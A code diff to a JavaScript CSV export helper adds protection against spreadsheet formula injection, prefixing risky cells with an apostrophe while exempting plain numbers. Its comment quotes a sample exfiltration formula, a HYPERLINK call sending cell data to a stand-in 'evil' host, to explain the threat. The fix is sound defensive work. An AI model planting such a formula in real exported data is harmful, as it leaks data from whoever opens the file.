@@ -66,9 +66,26 @@ function parseCsvObjects(text) {
   return { headers, rows: out };
 }
 
-/** Quote a value only when it needs it, doubling any embedded quotes. */
+/**
+ * Quote a value only when it needs it, doubling any embedded quotes — and
+ * defuse anything a spreadsheet would treat as a FORMULA rather than as text.
+ *
+ * Excel, Numbers and Sheets all execute a cell beginning = + - @ (or a leading
+ * tab/CR before one). A sponsor name typed into the admin as
+ * =HYPERLINK("https://evil/?"&A1,"Click") therefore runs on the machine of
+ * whoever opens the export — the attacker never has to touch that machine.
+ * Prefixing an apostrophe makes the spreadsheet read the cell as text; the
+ * apostrophe itself is not shown in the cell.
+ *
+ * Plain numbers are exempt, so a negative price still imports as a number
+ * instead of arriving as the text "-1200".
+ */
+const FORMULA_START = /^[=+\-@\t\r]/;
+const PLAIN_NUMBER  = /^-?\d+(\.\d+)?$/;
+
 function csvCell(v) {
-  const s = v == null ? '' : String(v);
+  let s = v == null ? '' : String(v);
+  if (FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
   return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
